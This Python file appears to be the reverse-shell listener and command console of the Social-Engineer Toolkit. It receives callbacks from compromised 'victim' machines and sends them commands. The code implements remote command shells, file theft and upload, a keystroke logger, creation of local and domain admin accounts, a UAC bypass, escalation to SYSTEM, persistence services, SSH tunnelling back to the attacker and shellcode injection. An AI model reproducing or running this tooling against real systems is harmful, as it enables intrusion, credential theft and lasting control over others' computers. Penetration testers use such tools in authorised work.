from socket import *
import os
import threading
import sys
import re
import thread
import time
import select
import base64
import datetime
import subprocess
import binascii
from src.core.setcore import *
definepath = os.getcwd()
sys.path.append(definepath)
if os.path.isfile(userconfigpath + "uac.address"):
    os.remove(userconfigpath + "uac.address")
if os.path.isfile(userconfigpath + "system.address"):
    os.remove(userconfigpath + "system.address")
core_modules = True
def start_listener():
    operating_system = check_os()
    tab_complete = True
    try:
        import readline
    except ImportError:
        print("[!] python-readline is not installed, tab completion will be disabled.")
        tab_complete = False
    core_module = True
    if tab_complete == True:
        readline.parse_and_bind("tab: complete")
    HOST = ''  # bind to all interfaces
    try:
        PORT = int(sys.argv[1])
    except IndexError:
        if check_options("PORT=") != 0:
            PORT = check_options("PORT=")
        else:
            PORT = input(setprompt("0", "Port to listen on [443]"))
            if PORT == "":
                print("[*] Defaulting to port 443 for the listener.")
                PORT = 443
                update_options("PORT=443")
        try:
            PORT = int(PORT)
        except ValueError:
            while 1:
                print_warning("Needs to be a port number!")
                PORT = input(setprompt("0", "Port to listen on: "))
                if PORT == "":
                    PORT = 443
                    break
                try:
                    PORT = int(PORT)
                    break
                except ValueError:
                    PORT = 443
                    break
    def log(error):
        if os.path.isfile("src/logs/"):
            now = datetime.datetime.today()
            filewrite = open("src/logs/set_logfile.log", "a")
            filewrite.write(now + error + "\r\n")
            filewrite.close()
    try:
        from Crypto.Cipher import AES
        encryption = 1
        print_status(
            "Crypto.Cipher library is installed. AES will be used for socket communication.")
        print_status(
            "All communications will leverage AES 256 and randomized cipher-key exchange.")
        BLOCK_SIZE = 32
        PADDING = '{'
        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
        EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
        DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
        secret = os.urandom(BLOCK_SIZE)
        cipher = AES.new(secret)
    except ImportError:
        encryption = 0
        print_warning(
            "Crypto.Cipher python module not detected. Disabling encryption.")
        if operating_system != "windows":
            print_warning(
                "If you want encrypted communications download from here: http://ftp.dlitz.net/pub/dlitz/crypto/pycrypto/pycrypto-2.3.tar.gz")
            print_warning(
                "Or if your on Ubuntu head over to: http://packages.ubuntu.com/search?keywords=python-crypto")
            print_warning(
                "Or you can simply type apt-get install python-crypto or in Back|Track apt-get install python2.5-crypto")
    def exit_menu():
        print("\n[*] Exiting the Social-Engineer Toolkit (SET) Interactive Shell.")
    mysock = socket.socket(AF_INET, SOCK_STREAM)
    mysock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    addr = (HOST, PORT)
    try:
        mysock.bind(addr)
        mysock.listen(100000)
    except Exception as error:
        if core_modules == True:
            log(error)
            print_error(
                "ERROR:Unable to bind to listener port, do you have something else listening?")
            sys.exit()  # exit_set()
        if core_modules == False:
            sys.exit("[!] Unable to bind to interfact. Try again.")
    count = 0
    def send_packet(message, conn, encryption):
        try:
            if encryption == 1:
                encoded = EncodeAES(cipher, message)
                normal_size = len(encoded)
                normal_size = str(normal_size)
                normal_size_crypt = EncodeAES(cipher, normal_size)
                conn.send(str(normal_size_crypt))
                time.sleep(0.3)
                conn.send(str(encoded))
            if encryption == 0:
                message_size = str(len(message))
                conn.send(message_size)
                conn.send(str(message))
        except Exception as e:
            print_warning(
                "An exception occured. Handling it and keeping session alive. Error: " + str(e))
            pass
    def decrypt_packet(message, encryption):
        try:
            if encryption == 1:
                return DecodeAES(cipher, message)
            if encryption == 0:
                return message
        except Exception as e:
            print_warning(
                "An exception occured. Handling it and keeping session alive. Error: " + str(e))
            pass
    class Completer:
        def __init__(self):
            if operating_system == "windows":
                self.words = ["shell", "localadmin", "help", "?", "domainadmin", "ssh_tunnel", "bypassuac", "lockworkstation", "grabsystem", "download",
                              "upload", "ps", "kill", "keystroke_start", "keystroke_dump", "reboot", "persistence", "removepersistence", "shellcode", "cls", "clear"]
            if operating_system == "posix":
                self.words = ["shell", "help", "?", "ssh_tunnel",
                              "download", "upload", "reboot", "cls", "clear"]
            self.prefix = None
        def complete(self, prefix, index):
            if prefix != self.prefix:
                self.matching_words = [
                    w for w in self.words if w.startswith(prefix)]
                self.prefix = prefix
            else:
                pass
            try:
                return self.matching_words[index]
            except IndexError:
                return None
    class Completer2:
        def __init__(self):
            self.words = []
            self.prefix = None
        def complete(self, prefix, index):
            if prefix != self.prefix:
                self.matching_words = [
                    w for w in self.words if w.startswith(prefix)]
                self.prefix = prefix
            else:
                pass
            try:
                return self.matching_words[index]
            except IndexError:
                return None
    def handle_connection(conn, addr, encryption, operating_system):
        print_status(
            "Dropping into the Social-Engineer Toolkit Interactive Shell.")
        try:
            if encryption == 1:
                random_string = os.urandom(52)
                data = conn.send(random_string)
                data = conn.recv(1024)
                if data == random_string:
                    secret_send = binascii.hexlify(secret)
                    conn.send(secret_send)
                else:
                    encryption = 0
            if encryption == 0:
                random_string = os.urandom(51)
                conn.send(random_string)
                data = conn.recv(51)
                data = decrypt_packet(data, encryption)
        except Exception as e:
            print(e)
            print_warning(
                "Looks like the session died. Dropping back into selection menu.")
            return_continue()
            global count
            count = 2
            garbage1 = ""
            garbage2 = ""
            garbage3 = ""
            thread.start_new_thread(
                call_connections, (d, garbage1, garbage2, garbage3))
            sys.exit()  # exit_set()
        try:
            while 1:
                if tab_complete == True:
                    completer = Completer()
                    readline.set_completer(completer.complete)
                data = input(setprompt(["25"], ""))
                if data == "quit" or data == "exit" or data == "back":
                    print_warning("Dropping back to list of victims.\n")
                    send_packet("quit", conn, encryption)
                    break
                if data == "cls" or data == "clear":
                    os.system("clear")
                if data == "help" or data == "?":
                    print("Welcome to the Social-Engineer Toolkit Help Menu.\n\nEnter the following commands for usage:")
                    if operating_system == "posix" or operating_system == "windows":
                        print("""
Command: shell
Explanation: drop into a command shell
Example: shell
Command: download <path_to_file>
Explanation: downloads a file locally to the SET root directory.
Example: download C:\\boot.ini or download /etc/passwd
Command: upload <path_to_file_on_attacker> <path_to_write_on_victim>
Explanation: uploads a file to the victim system
Example: upload /root/nc.exe C:\\nc.exe or upload /root/backdoor.sh /root/backdoor.sh
Command: ssh_tunnel <attack_ip> <attack_ssh_port> <attack_tunnelport> <user> <pass> <tunnel_port>
Explanation: This module tunnels ports from the compromised victims machine back to your machine.
Example: ssh_tunnel publicipaddress 22 80 root complexpassword?! 80
Command: exec <command>
Explanation: Execute a command on your LOCAL 'attacker' machine.
Example exec ls -al
Command: ps
Explanation: List running processes on the victim machine.
Example: ps
Command: kill <pid>
Explanation: Kill a process based on process ID (number) returned from ps.
Example: kill 3143
Command: reboot now
Explanation: Reboots the remote server instantly.
Example: reboot now""")
                    if operating_system == "windows":
                        print(r"""
Command: localadmin <username> <password>
Explanation: adds a local admin to the system
Example: localadmin bob p@55w0rd!
Command: domainadmin <username> <password>
Explanation: adds a local admin to the system
Example: domainadmin bob p@55w0rd!
Command: bypassuac <ipaddress_of_listener> <port_of_listener> <x86 or x64>
Explanation: Trigger another SET interactive shell with the UAC safe flag
Example bypassuac 172.16.32.128 443 x64
Command: grabsystem <ipaddress_of_listener> <port_of_listener>
Explanation: Uploads a new set interactive shell running as a service and as SYSTEM.
Caution: If using on Windows 7 with UAC enabled, run bypassuac first before running this.
Example: grabsystem 172.16.32.128 443
Command: keystroke_start
Explanation: Starts a keystroke logger on the victim machine. It will stop when shell exits.
Example: keystroke_start
Command: keystroke_dump
Explanation: Dumps the information from the keystroke logger. You must run keystroke_start first.
Example: keystroke_dump
Command: lockworkstation
Explanation: Will lock the victims workstation forcing them to log back in. Useful for capturing keystrokes.
Example: lockworkstation
Command: persistence <ipaddress_of_listener> <port_of_listener>
Explanation: Persistence will spawn a SET interactive shell every 30 minutes on the victim machine.
Example: persistence 172.16.32.128 443
Warning: Will not work with UAC enabled *yet*.
Command: removepersistence
Explanation: Will remove persistence from the remote victim machine.
Example: removepersistence
Command: shellcode
Explanation: This will execute native shellcode on the victim machine through python.
Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
""")
                try:
                    base_counter = 0
                    match = re.search("exec", data)
                    if match:
                        base_counter = 1
                        temp_data = data.split(" ")
                        data = data.replace("exec ", "")
                        command = data
                        data = "exec"
                        data = "exec test"
                        data = data.split(" ")
                        temp_data = temp_data[1]
                        data = "exec"
                    data = data.split(" ")
                    if data[0] == "localadmin":
                        creds = "%s,%s" % (data[1], data[2])
                        data = "localadmin"
                        base_counter = 1
                    if data[0] == "domainadmin":
                        creds = "%s,%s" % (data[1], data[2])
                        data = "domainadmin"
                        base_counter = 1
                    if data[0] == "shell":
                        base_counter = 1
                        data = data[0]
                    if data[0] == "download":
                        download_path = data[1]
                        data = data[0]
                        base_counter = 1
                    if data[0] == "ssh_tunnel":
                        ssh_server_ip = data[1]
                        ssh_server_port_address = data[2]
                        ssh_server_tunnel_port = data[3]
                        ssh_server_username = data[4]
                        ssh_server_password = data[5]
                        victim_server_port = data[6]
                        data = data[0]
                        base_counter = 1
                    if data[0] == "upload":
                        upload = data[1]
                        write_path = data[2]
                        data = data[0]
                        base_counter = 1
                    if data[0] == "bypassuac":
                        ipaddress = data[1] + " " + data[2]
                        exe_platform = data[3]
                        data = data[0]
                        base_counter = 1
                    if data[0] == "persistence":
                        ipaddress = data[1] + " " + data[2]
                        data = data[0]
                        base_counter = 1
                    if data[0] == "removepersistence":
                        base_counter = 1
                        data = data[0]
                    if data[0] == "keystroke_start":
                        data = "keystroke_start"
                        base_counter = 1
                    if data[0] == "keystroke_dump":
                        data = "keystroke_dump"
                        base_counter = 1
                    if data[0] == "grabsystem":
                        ipaddress = data[1] + " " + data[2]
                        data = data[0]
                        base_counter = 1
                    if data[0] == "lockworkstation":
                        data = "lockworkstation"
                        base_counter = 1
                    if data[0] == "ps":
                        data = "ps"
                        base_counter = 1
                    if data[0] == "reboot":
                        if data[1] == "now":
                            data = "reboot now"
                            base_counter = 1
                    if data[0] == "kill":
                        pid_number = data[1]
                        data = "kill"
                        base_counter = 1
                    if data[0] == "exec":
                        data = "exec"
                        base_counter = 1
                    if data[0] == "shellcode":
                        shellcode_inject = input(
                            "Paste your shellcode into here: ")
                        shellcode_inject = shellcode_inject.decode(
                            "string_escape")
                        data = "shellcode"
                        base_counter = 1
                    if data[0] == "help" or data[0] == "?":
                        base_counter = 1
                    if data[0] == "":
                        base_counter = 1
                    if data[0] == "cls" or data[0] == "clear":
                        base_counter = 1
                    if base_counter == 0:
                        print("[!] The command was not recognized.")
                except IndexError:
                    if data[0] == "kill":
                        print("[!] Usage: kill <pid_id>")
                    if data[0] == "exec":
                        print("[!] Usage: exec <command>")
                    if data[0] == "bypassuac":
                        print("[!] Usage: bypassuac <set_reverse_listener_ip> <set_port> <x64 or x86>")
                    if data[0] == "upload":
                        print("[!] Usage: upload <filename> <path_on_victim>")
                    if data[0] == "download":
                        print("[!] Usage: download <filename>")
                    if data[0] == "ssh_tunnel":
                        print("[!] Usage: ssh_tunnel <attack_ip> <attack_ssh_port> <attack_tunnelport> <user> <pass> <tunnel_port>")
                    if data[0] == "domainadmin":
                        print("[!] Usage: domainadmin <username> <password>")
                    if data[0] == "localadmin":
                        print("[!] Usage: localadmin <username> <password>")
                    if data[0] == "grabsystem":
                        print("[!] Usage: grabsystem <ipaddress_of_listener> <port_of_listener>")
                    if data[0] == "reboot":
                        print("[!] Usage: reboot now")
                    if data[0] == "persistence":
                        print("[!] Usage: persistence <set_reverse_listener_ip> <set_port>")
                    if data[0] == "shellcode":
                        print("[!] Usage: shellcode <paste shellcode>")
                except AttributeError as e:
                    log(e)
                    pass
                except Exception as e:
                    print("[!] Something went wrong, printing error: " + str(e))
                    log(e)
                    garbage1 = ""
                    garbage2 = ""
                    garbage3 = ""
                    thread.start_new_thread(
                        call_connections, (d, garbage1, garbage2, garbage3))
                    sys.exit()
                if data == "shell":
                    send_packet(data, conn, encryption)
                    print("[*] Entering a Windows Command Prompt. Enter your commands below.\n")
                    while 1:
                        try:
                            data = input(setprompt(["25", "26"], ""))
                            if data == "exit" or data == "quit" or data == "back":
                                print("[*] Dropping back to interactive shell... ")
                                send_packet(data, conn, encryption)
                                break
                            if data != "":
                                send_packet(data, conn, encryption)
                                data = conn.recv(1024)
                                data = decrypt_packet(data, encryption)
                                MSGLEN = 0
                                dataout = ""
                                length = int(data)
                                while 1:
                                    data = conn.recv(1024)
                                    if not data:
                                        break
                                    dataout += data
                                    MSGLEN = MSGLEN + len(data)
                                    if MSGLEN == int(length):
                                        break
                                data = decrypt_packet(dataout, encryption)
                                print(data)
                        except ValueError as e:
                            log(e)
                            print("[!] Response back wasn't expected. The session probably died.")
                            garbage1 = ""
                            garbage2 = ""
                            garbage3 = ""
                            thread.start_new_thread(
                                call_connections, (d, garbage1, garbage2, garbage3))
                            sys.exit()  # exit_set()
                if data == "localadmin":
                    print("[*] Attempting to add a user account with administrative permissions.")
                    send_packet(data, conn, encryption)
                    send_packet(creds, conn, encryption)
                    print("[*] User add completed. Check the system to ensure it worked correctly.")
                if data == "domainadmin":
                    print("[*] Attempting to add a user account with domain administrative permissions.")
                    send_packet(data, conn, encryption)
                    send_packet(creds, conn, encryption)
                    print("[*] User add completed. Check the system to ensure it worked correctly.")
                if data == "keystroke_start":
                    send_packet(data, conn, encryption)
                    print("[*] Keystroke logger has been started on the victim machine")
                if data == "keystroke_dump":
                    send_packet(data, conn, encryption)
                    data = conn.recv(1024)
                    data = decrypt_packet(data, encryption)
                    data = conn.recv(int(data))
                    data = decrypt_packet(data, encryption)
                    print(data)
                if data == "download":
                    data = "downloadfile"
                    send_packet(data, conn, encryption)
                    send_packet(download_path, conn, encryption)
                    download_path = download_path.replace("\\", "_")
                    download_path = download_path.replace("/", "_")
                    download_path = download_path.replace(":", "_")
                    filewrite = open(download_path, "wb")
                    data = conn.recv(1024)
                    data = decrypt_packet(data, encryption)
                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = conn.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)
                    data = decrypt_packet(data, encryption)
                    if data == "File not found.":
                        print("[!] Filename was not found. Try again.")
                        break
                    if data != "File not found.":
                        filewrite.write(data)
                        filewrite.close()
                        definepath = os.getcwd()
                        print("[*] Filename: %s successfully downloaded." % (download_path))
                        print("[*] File stored at: %s/%s" % (definepath, download_path))
                if data == "lockworkstation":
                    print("[*] Sending the instruction to lock the victims workstation...")
                    send_packet(data, conn, encryption)
                    print("[*] Victims workstation has been locked...")
                if data == "grabsystem":
                    data = "getsystem"
                    send_packet(data, conn, encryption)
                    time.sleep(0.5)
                    write_path = "not needed"
                    send_packet(write_path, conn, encryption)
                    data_file = ""
                    if os.path.isfile("src/payloads/set_payloads/shell.windows"):
                        upload = "src/payloads/set_payloads/shell.windows"
                    if os.path.isfile("shell.windows"):
                        upload = "shell.windows"
                    if os.path.isfile(upload):
                        fileopen = open(upload, "rb")
                        print("[*] Attempting to upload interactive shell to victim machine.")
                        data_file = fileopen.read()
                        fileopen.close()
                        send_packet(data_file, conn, encryption)
                        data = conn.recv(1024)
                        data = decrypt_packet(data, encryption)
                        data = conn.recv(int(data))
                        data = decrypt_packet(data, encryption)
                        if data == "Confirmed":
                            print("[*] SET Interactive shell successfully uploaded to victim.")
                        if data == "Failed":
                            print("[!] File had an issue saving to the victim machine. Try Again?")
                    time.sleep(0.5)
                    if os.path.isfile("%s/system.address" % (userconfigpath)):
                        os.remove("%s/system.address" % (userconfigpath))
                    filewrite = open("%s/system.address" % (userconfigpath), "w")
                    filewrite.write(addr)
                    filewrite.close()
                    send_packet(ipaddress, conn, encryption)
                    print("[*] You should have a new shell spawned that is running as SYSTEM in a few seconds...")
                if data == "bypassuac":
                    if os.path.isfile(userconfigpath + "uac.address"):
                        os.remove(userconfigpath + "uac.address")
                    filewrite = open(userconfigpath + "uac.address", "w")
                    filewrite.write(addr)
                    filewrite.close()
                    send_packet(data, conn, encryption)
                    time.sleep(0.5)
                    write_path = "not needed"
                    send_packet(write_path, conn, encryption)
                    data_file = ""
                    if exe_platform == "x64":
                        if os.path.isfile("src/payloads/set_payloads/uac_bypass/x64.binary"):
                            upload = "src/payloads/set_payloads/uac_bypass/x64.binary"
                        if os.path.isfile("uac_bypass/x64.binary"):
                            upload = "uac_bypass/x64.binary"
                    if exe_platform == "x86":
                        if os.path.isfile("src/payloads/set_payloads/uac_bypass/x86.binary"):
                            upload = "src/payloads/set_payloads/uac_bypass/x86.binary"
                        if os.path.isfile("uac_bypass/x86.binary"):
                            upload = "uac_bypass/x86.binary"
                    if os.path.isfile(upload):
                        fileopen = open(upload, "rb")
                        print("[*] Attempting to upload UAC bypass to the victim machine.")
                        data_file = fileopen.read()
                        fileopen.close()
                        send_packet(data_file, conn, encryption)
                        data = conn.recv(1024)
                        data = decrypt_packet(data, encryption)
                        data = conn.recv(int(data))
                        data = decrypt_packet(data, encryption)
                        if data == "Confirmed":
                            print("[*] Initial bypass has been uploaded to victim successfully.")
                        if data == "Failed":
                            print("[!] File had an issue saving to the victim machine. Try Again?")
                    time.sleep(0.5)
                    send_packet(write_path, conn, encryption)
                    data_file = ""
                    if os.path.isfile("src/payloads/set_payloads/shell.windows"):
                        upload = "src/payloads/set_payloads/shell.windows"
                    if os.path.isfile("shell.windows"):
                        upload = "shell.windows"
                    if os.path.isfile(upload):
                        fileopen = open(upload, "rb")
                        print("[*] Attempting to upload interactive shell to victim machine.")
                        data_file = fileopen.read()
                        fileopen.close()
                        send_packet(data_file, conn, encryption)
                        data = conn.recv(1024)
                        data = decrypt_packet(data, encryption)
                        data = conn.recv(int(data))
                        data = decrypt_packet(data, encryption)
                        if data == "Confirmed":
                            print("[*] SET Interactive shell successfully uploaded to victim.")
                        if data == "Failed":
                            print("[!] File had an issue saving to the victim machine. Try Again?")
                    send_packet(ipaddress, conn, encryption)
                    print("[*] You should have a new shell spawned that is UAC safe in a few seconds...")
                if data == "removepersistence":
                    print("[*] Telling interactive shell to remove persistence from startup.")
                    send_packet(data, conn, encryption)
                    print("[*] Service has been scheduled for deletion. It may take a reboot or when the 30 minute loop is finished.")
                if data == "persistence":
                    try:
                        send_packet(data, conn, encryption)
                        time.sleep(0.5)
                        write_path = "not needed"
                        send_packet(write_path, conn, encryption)
                        data_file = ""
                        if os.path.isfile("src/payloads/set_payloads/persistence.binary"):
                            if core_modules == True:
                                subprocess.Popen(
                                    "cp src/payloads/set_payloads/persistence.binary %s" % (userconfigpath), shell=True).wait()
                                upx("%s/persistence.binary" % (userconfigpath))
                                upload = "%s/persistence.binary" % (userconfigpath)
                            if core_modules == False:
                                upload = "src/payloads/set_payloads/persistence.binary"
                        if os.path.isfile("persistence.binary"):
                            upload = "persistence.binary"
                        if os.path.isfile(upload):
                            fileopen = open(upload, "rb")
                            print("[*] Attempting to upload the SET Interactive Service to the victim.")
                            data_file = fileopen.read()
                            fileopen.close()
                            send_packet(data_file, conn, encryption)
                            data = conn.recv(1024)
                            data = decrypt_packet(data, encryption)
                            data = conn.recv(int(data))
                            data = decrypt_packet(data, encryption)
                            if data == "Confirmed":
                                print("[*] Initial service has been uploaded to victim successfully.")
                            if data == "Failed":
                                print("[!] File had an issue saving to the victim machine. Try Again?")
                        time.sleep(0.5)
                        send_packet(write_path, conn, encryption)
                        data_file = ""
                        if os.path.isfile("src/payloads/set_payloads/shell.windows"):
                            if core_modules == True:
                                subprocess.Popen(
                                    "cp src/payloads/set_payloads/shell.windows %s" % (userconfigpath), shell=True).wait()
                                upx(userconfigpath + "shell.windows")
                                upload = userconfigpath + "shell.windows"
                            if core_modules == False:
                                upload = "src/payloads/set_payloads/shell.windows"
                        if os.path.isfile("shell.windows"):
                            upload = "shell.windows"
                        if os.path.isfile(upload):
                            fileopen = open(upload, "rb")
                            print("[*] Attempting to upload SET Interactive Shell to victim machine.")
                            data_file = fileopen.read()
                            fileopen.close()
                            send_packet(data_file, conn, encryption)
                            data = conn.recv(1024)
                            data = decrypt_packet(data, encryption)
                            data = conn.recv(int(data))
                            data = decrypt_packet(data, encryption)
                            if data == "Confirmed":
                                print("[*] SET Interactive shell successfully uploaded to victim.")
                            if data == "Failed":
                                print("[!] File had an issue saving to the victim machine. Try Again?")
                        send_packet(ipaddress, conn, encryption)
                        print("[*] Service has been created on the victim machine. You should have a connection back every 30 minutes.")
                    except Exception:
                        print("[!] Failed to create service on victim. If UAC is enabled this will fail. Even with bypassUAC.")
                if data == "upload":
                    data = "uploadfile"
                    send_packet(data, conn, encryption)
                    time.sleep(0.5)
                    send_packet(write_path, conn, encryption)
                    data_file = ""
                    if os.path.isfile(upload):
                        fileopen = open(upload, "rb")
                        print("[*] Attempting to upload %s to %s on victim machine." % (upload, write_path))
                        data_file = fileopen.read()
                        fileopen.close()
                        send_packet(data_file, conn, encryption)
                        data = conn.recv(1024)
                        data = decrypt_packet(data, encryption)
                        data = conn.recv(int(data))
                        data = decrypt_packet(data, encryption)
                        if data == "Confirmed":
                            print("[*] File has been uploaded to victim under path: " + write_path)
                        if data == "Failed":
                            print("[!] File had an issue saving to the victim machine. Try Again?")
                    else:
                        print("[!] File wasn't found. Try entering the path again.")
                if data == "ssh_tunnel":
                    data = "paramiko"
                    print("[*] Telling the victim machine we are switching to SSH tunnel mode..")
                    send_packet(data, conn, encryption)
                    data = conn.recv(1024)
                    data = decrypt_packet(data, encryption)
                    data = conn.recv(int(data))
                    data = decrypt_packet(data, encryption)
                    if data == "Paramiko Confirmed.":
                        print("[*] Acknowledged the server supports SSH tunneling..")
                        data = ssh_server_ip + "," + ssh_server_port_address + "," + ssh_server_tunnel_port + \
                            "," + ssh_server_username + "," + ssh_server_password + "," + victim_server_port
                        send_packet(data, conn, encryption)
                        print("[*] Tunnel is establishing, check IP Address: " + ssh_server_ip + " on port: " + ssh_server_tunnel_port)
                        print("[*] As an example if tunneling RDP you would rdesktop localhost 3389")
                if data == "ps":
                    send_packet(data, conn, encryption)
                    data = conn.recv(1024)
                    data = decrypt_packet(data, encryption)
                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = conn.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)
                    data = decrypt_packet(dataout, encryption)
                    print(data)
                if data == "reboot now":
                    data = "reboot"
                    send_packet(data, conn, encryption)
                    data = conn.recv(1024)
                    data = decrypt_packet(data, encryption)
                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = conn.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)
                    data = decrypt_packet(dataout, encryption)
                    print(data)
                if data == "kill":
                    send_packet(data, conn, encryption)
                    send_packet(pid_number, conn, encryption)
                    data = conn.recv(1024)
                    data = decrypt_packet(data, encryption)
                    print("[*] Process has been killed with PID: " + pid_number)
                    data = conn.recv(1024)
                if data == "exec":
                    proc = subprocess.Popen(
                        command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    stdout_value = proc.stdout.read()
                    stderr_value = proc.stderr.read()
                    data = stdout_value + stderr_value
                    print(data)
                if data == "shellcode":
                    send_packet(data, conn, encryption)
                    time.sleep(0.5)
                    send_packet(shellcode_inject, conn, encryption)
        except Exception as e:
            print("[!] Something went wrong printing error: " + str(e))
            log(e)
            count = 2
            garbage1 = ""
            garbage2 = ""
            garbage3 = ""
            thread.start_new_thread(
                call_connections, (d, garbage1, garbage2, garbage3))
            sys.exit()  # exit_set()
        if data == "quit" or data == "exit" or data == "back":
            count = 2
            garbage1 = ""
            garbage2 = ""
            garbage3 = ""
            thread.start_new_thread(
                call_connections, (d, garbage1, garbage2, garbage3))
    print_status(
        "The Social-Engineer Toolkit (SET) is listening on: 0.0.0.0:" + str(PORT))
    global d
    d = {}
    def update_dict(conn, addr):
        d[conn] = addr[0]
    def call_connections(d, garbage1, garbage2, garbage3):
        global count
        count = 2
        counter = 1
        if false_shell == False:
            while 1:
                try:
                    print("*** Pick the number of the shell you want ***\n")
                    for records in d.items():
                        if records[1] != "127.0.0.1":
                            print(str(counter) + ": " + records[1])
                            counter += 1
                    print("\n")
                    choice = input(setprompt("0", ""))
                    choice = int(choice)
                    if choice > counter - 1:
                        print("[!] Invalid choice, please enter a valid number to interact with.")
                    if choice <= counter - 1:
                        break
                    counter = 1
                except ValueError:
                    counter = 1
                    if choice == "quit" or choice == "exit" or choice == "back":
                        print_status("Returning back to the main menu.")
                        break
                    if len(choice) != 0:
                        choice = str(choice)
                        print("[!] Invalid choice, please enter a valid number to interact with.")
            if choice == "quit" or choice == "exit" or choice == "back":
                choice = 1
                sockobj = socket.socket(AF_INET, SOCK_STREAM)
                sockobj.connect(('', PORT))
            choice = int(choice) - 1
            dict_point = 0
            for records in d.items():
                if choice == dict_point:
                    conn = records[0]
                    addr = records[1]
                    thread.start_new_thread(
                        handle_connection, (conn, addr, encryption, operating_system))
                dict_point += 1
    try:
        while 1:
            if tab_complete == True:
                completer = Completer2()
                readline.set_completer(completer.complete)
            conn, addr = mysock.accept()
            bypass_counter = 0
            if addr[0] == "127.0.0.1":
                conn.close()
                sys.exit()  # pass
            false_shell = False
            if addr[0] != "127.0.0.1":
                try:
                    data = conn.recv(27)
                except Exception as e:
                    print(e)
                    false_shell = True
                if data != "IHAYYYYYIAMSETANDIAMWINDOWS":
                    if data != "IHAYYYYYIAMSETANDIAMPOSIXXX":
                        false_shell = True
                if data == "IHAYYYYYIAMSETANDIAMWINDOWS":
                    if os.path.isfile(userconfigpath + "system.address"):
                        fileopen = open(userconfigpath + "system.address", "r")
                        system = fileopen.read().rstrip()
                        system = system.replace(":WINDOWS", "")
                        system = system.replace(":UAC-SAFE", "")
                        if str(addr[0]) == str(system):
                            temp_addr = str(addr[0] + ":WINDOWS:SYSTEM")
                            bypass_counter = 1
                    if os.path.isfile(userconfigpath + "uac.address"):
                        fileopen = open(userconfigpath + "uac.address", "r")
                        uac = fileopen.read().rstrip()
                        uac = uac.replace(":WINDOWS", "")
                        if str(addr[0]) == str(uac):
                            temp_addr = str(addr[0] + ":WINDOWS:UAC-SAFE")
                            bypass_counter = 1
                    if bypass_counter != 1:
                        temp_addr = str(addr[0] + ":WINDOWS")
                    temp_pid = str(addr[1])
                    temp_addr = [temp_addr, temp_pid]
                    update_dict(conn, temp_addr)
                    operating_system = "windows"
                    bypass_counter = 1
                if data == "IHAYYYYYIAMSETANDIAMPOSIXXX":
                    temp_addr = str(addr[0] + ":POSIX")
                    temp_pid = str(addr[1])
                    temp_addr = [temp_addr, temp_pid]
                    update_dict(conn, temp_addr)
                    operating_system = "posix"
                    bypass_counter = 1
            if bypass_counter == 0:
                if addr[0] != "127.0.0.1":
                    if false_shell == False:
                        update_dict(conn, addr)
            if os.path.isfile(userconfigpath + "uac.address"):
                os.remove(userconfigpath + "uac.address")
                bypass_counter = 0
            if os.path.isfile(userconfigpath + "system.address"):
                os.remove(userconfigpath + "system.address")
                bypass_counter = 0
            if addr[0] != "127.0.0.1":
                if false_shell == False:
                    print("[*] Connection received from: " + addr[0] + "\n")
            if false_shell == False:
                count += 1
            try:
                if count == 1:
                    garbage1 = ""
                    garbage2 = ""
                    garbage3 = ""
                    thread.start_new_thread(
                        call_connections, (d, garbage1, garbage2, garbage3))
            except TypeError as e:  # except typerrors
                log(e)
                garbage1 = ""
                garbage2 = ""
                garbage3 = ""
                thread.start_new_thread(
                    call_connections, (d, garbage1, garbage2, garbage3))
            except Exception as e:  # handle exceptions
                print("[!] Something went wrong. Printing error: " + str(e))
                log(e)
                garbage1 = ""
                garbage2 = ""
                garbage3 = ""
                thread.start_new_thread(
                    call_connections, (d, garbage1, garbage2, garbage3))
    except KeyboardInterrupt:
        exit_menu()
        sys.exit(-1)
    except Exception as e:
        print_error("Something went wrong: ")
        print(bcolors.RED + str(e) + bcolors.ENDC)
        count = 2
        garbage1 = ""
        garbage2 = ""
        garbage3 = ""
        thread.start_new_thread(
            call_connections, (d, garbage1, garbage2, garbage3))
        log(e)
        sys.exit()
start_listener()